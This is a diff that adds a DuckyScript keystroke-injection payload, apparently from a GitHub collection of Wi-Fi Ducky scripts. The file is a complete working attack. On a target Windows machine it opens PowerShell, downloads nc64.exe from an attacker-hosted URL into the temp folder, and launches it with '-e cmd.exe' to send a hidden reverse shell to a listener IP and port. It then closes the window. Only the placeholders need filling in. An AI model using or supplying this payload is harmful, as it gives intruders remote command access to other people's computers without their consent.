@@ -1,0 +1,33 @@
+REM Written by HonkinWaffles https://github.com/HonkinWaffles/Wi-Fi-Ducky-Scripts
+REM Description: Powershell and Netcat for reverse shell
+
+REM !! CHANGES REQUIRED !!
+REM <HOSTED URL> - URL to where nc64.exe is hosted
+REM <IP_ADDR> - Change the IP to your listener IP
+REM <PORT>  - Port of listener
+
+REM If you do not get a connection after a couple of tries increase the DEFAULTDELAY
+DEFAULTDELAY 150
+
+REM Open Powershell
+GUI r
+STRING powershell
+ENTER
+DELAY 1000
+
+REM Set path to temp
+STRING $path = [System.IO.Path]::GetTempPath()
+ENTER
+STRING Set-Location $path
+ENTER
+
+REM Download nc64.exe
+STRING Invoke-Webrequest http://<HOSTED_URL>/nc64.exe -OutFile 4323.exe
+ENTER
+
+REM Connect to listener
+STRING ./4323.exe <IP_ADDR> <PORT> -e cmd.exe -d
+ENTER
+
+REM Exit Powershell
+ALT F4
